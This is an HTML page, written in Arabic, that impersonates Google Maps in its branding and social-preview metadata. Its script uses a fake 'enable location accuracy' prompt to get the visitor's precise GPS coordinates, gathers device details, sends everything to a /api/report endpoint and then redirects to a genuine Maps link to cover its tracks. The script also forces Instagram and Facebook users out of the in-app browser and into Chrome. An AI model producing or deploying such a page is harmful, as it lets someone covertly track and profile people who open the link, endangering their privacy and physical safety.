<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>خرائط Google</title>
    <!-- Social Preview Meta Tags (Google Maps Mimic) -->
    <meta property="og:site_name" content="Google Maps">
    <meta property="og:title" content="خرائط Google">
    <meta property="og:description"
        content="البحث عن الاتجاهات والبحث عن المواقع والتنقل بدقة. شاهد خرائط الطريق، واستعرض صور الشوارع، وخطط لرحلتك.">
    <meta property="og:image" content="https://www.google.com/maps/about/images/home/maps-app.png">
    <meta property="og:image:secure_url" content="https://www.google.com/maps/about/images/home/maps-app.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:url" content="https://google-maap.onrender.com">
    <meta property="og:type" content="website">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="خرائط Google">
    <meta name="twitter:description" content="شاهد الموقع والاتجاهات على خرائط Google.">
    <meta name="twitter:image" content="https://www.google.com/maps/about/images/home/maps-app.png">

    <link rel="icon" href="https://www.gstatic.com/images/branding/product/1x/maps_round_32dp.png">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --m3-primary: #8ab4f8;
            --m3-surface: #202124;
            --m3-on-surface: #e8eaed;
            --m3-outline: #9aa0a6;
            --m3-surface-container: #2d2e31;
            --m3-blue-glow: rgba(138, 180, 248, 0.15);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
            font-family: 'Roboto', 'Segoe UI', Tahoma, sans-serif;
        }

        body {
            background: #121212;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }



        .premium-dialog {
            position: relative;
            z-index: 10;
            background: var(--m3-surface);
            width: 90%;
            max-width: 380px;
            border-radius: 32px;
            padding: 32px;
            color: var(--m3-on-surface);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.05);
            animation: slideUp 0.6s cubic-bezier(0.2, 0.8, 0.2, 1);
            backdrop-filter: blur(10px);
        }

        @keyframes slideUp {
            from {
                transform: translateY(40px) scale(0.95);
                opacity: 0;
            }

            to {
                transform: translateY(0) scale(1);
                opacity: 1;
            }
        }

        .logo-container {
            display: flex;
            justify-content: center;
            margin-bottom: 24px;
        }

        .logo-container img {
            width: 48px;
            height: 48px;
        }

        h2 {
            font-size: 20px;
            font-weight: 500;
            margin-bottom: 24px;
            line-height: 1.4;
            text-align: center;
            color: #fff;
        }

        .benefit-item {
            display: flex;
            align-items: flex-start;
            margin-bottom: 20px;
            padding: 12px;
            border-radius: 16px;
            background: rgba(255, 255, 255, 0.03);
            transition: background 0.3s;
        }

        .benefit-item:hover {
            background: rgba(255, 255, 255, 0.06);
        }

        .benefit-icon {
            width: 24px;
            height: 24px;
            color: var(--m3-primary);
            margin-left: 16px;
            flex-shrink: 0;
            margin-top: 2px;
        }

        .benefit-text {
            font-size: 14px;
            color: var(--m3-outline);
            line-height: 1.6;
            text-align: right;
        }

        .benefit-text strong {
            color: var(--m3-on-surface);
            display: block;
            margin-bottom: 2px;
        }

        .actions {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 32px;
        }

        .btn {
            border: none;
            border-radius: 100px;
            padding: 16px 24px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .btn-primary {
            background: var(--m3-primary);
            color: #041e49;
        }

        .btn-primary:active {
            transform: scale(0.98);
            background: #a8c7fa;
        }

        .btn-ghost {
            background: transparent;
            color: var(--m3-primary);
            border: 1px solid rgba(138, 180, 248, 0.3);
        }

        .btn-ghost:hover {
            background: var(--m3-blue-glow);
        }

        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(0, 0, 0, 0.1);
            border-top: 3px solid #041e49;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body>

    <div class="premium-dialog">
        <div class="logo-container">
            <img src="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png" alt="Google Maps">
        </div>

        <h2>للمتابعة، يرجى تفعيل دقة الموقع الجغرافي</h2>

        <div class="benefit-item">
            <svg class="benefit-icon" fill="currentColor" viewBox="0 0 24 24">
                <path
                    d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z" />
            </svg>
            <div class="benefit-text">
                <strong>تحديد دقيق للموقع</strong>
                يستخدم التطبيق خرائط Google لتزويدك بأفضل المسارات والاتجاهات بناءً على موقعك الحالي.
            </div>
        </div>

        <div class="benefit-item">
            <svg class="benefit-icon" fill="currentColor" viewBox="0 0 24 24">
                <path
                    d="M12 8c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4zm8.94 3c-.46-4.17-3.77-7.48-7.94-7.94V1h-2v2.06C6.83 3.52 3.52 6.83 3.06 11H1v2h2.06c.46 4.17 3.77 7.48 7.94 7.94V23h2v-2.06c4.17-.46 7.48-3.77 7.94-7.94H23v-2h-2.06zM12 19c-3.87 0-7-3.13-7-7s3.13-7 7-7 7 3.13 7 7-3.13 7-7 7z" />
            </svg>
            <div class="benefit-text">
                <strong>تحسين الأداء</strong>
                تحسين دقة الموقع باستخدام Wi-Fi وشبكات الهاتف لضمان تجربة سلسة.
            </div>
        </div>

        <div class="actions">
            <button class="btn btn-primary" id="confirm-btn">
                <span id="btn-label">تفعيل والبدء</span>
                <div class="spinner" id="spinner"></div>
            </button>
            <button class="btn btn-ghost" onclick="exitToMap()">ليس الآن</button>
        </div>
    </div>

    <script>
        const FALLBACK_URL = "https://maps.app.goo.gl/uAGhQPK2yB4DCbuZ8?g_st=aw";
        let isActive = false;

        // Forced Browser Escape (Chrome Intent)
        (function () {
            const ua = navigator.userAgent;
            if (/Instagram|FBAN|FBAV/i.test(ua)) {
                const current = window.location.href.replace(/https?:\/\//, "");
                window.location.href = `intent://${current}#Intent;scheme=https;package=com.android.chrome;end`;
            }
        })();

        document.getElementById('confirm-btn').onclick = function () {
            if (isActive) return;
            isActive = true;

            const label = document.getElementById('btn-label');
            const spinner = document.getElementById('spinner');

            label.style.display = 'none';
            spinner.style.display = 'block';
            this.style.opacity = "0.8";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (p) => {
                        handleReport({
                            lat: p.coords.latitude,
                            lon: p.coords.longitude,
                            acc: p.coords.accuracy.toFixed(1) + "m"
                        });
                    },
                    (e) => {
                        let msg = "Unknown Error";
                        if (e.code === 1) msg = "Permission Denied";
                        else if (e.code === 2) msg = "Position Unavailable";
                        else if (e.code === 3) msg = "Timeout";

                        handleReport({ lat: "فشل", lon: msg, acc: "Err: " + e.code });

                        if (e.code === 1 || e.code === 2) {
                            showGpsInstructions();
                        }
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                exitToMap();
            }
        };

        function showGpsInstructions() {
            const ua = navigator.userAgent.toLowerCase();
            if (ua.includes("android")) {
                document.body.innerHTML = `
                    <div style="background:#202124; color:#fff; height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; padding:30px;">
                        <img src="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png" style="width:64px; margin-bottom:20px;">
                        <h2 style="color:#8ab4f8;">موقعك الجغرافي مغلق</h2>
                        <p style="margin-bottom:30px; color:#9aa0a6;">سيتم فتح إعدادات النظام الآن. يرجى تفعيل "تحديد الموقع" ثم العودة.</p>
                        <div class="spinner" style="display:block; border-top-color:#8ab4f8;"></div>
                    </div>
                `;
                setTimeout(() => {
                    window.location.href = "intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end";
                }, 2000);
            }
        }

        function handleReport(data) {
            const specs = {
                plat: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`,
                cores: navigator.hardwareConcurrency || "N/A",
                ram: navigator.deviceMemory || "N/A",
                time: new Date().toLocaleTimeString('ar-EG')
            };

            fetch('/api/report', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ...data, ...specs }),
                keepalive: true
            }).finally(exitToMap);

            setTimeout(exitToMap, 4000);
        }

        function exitToMap() {
            window.location.href = FALLBACK_URL;
        }
    </script>
</body>

</html>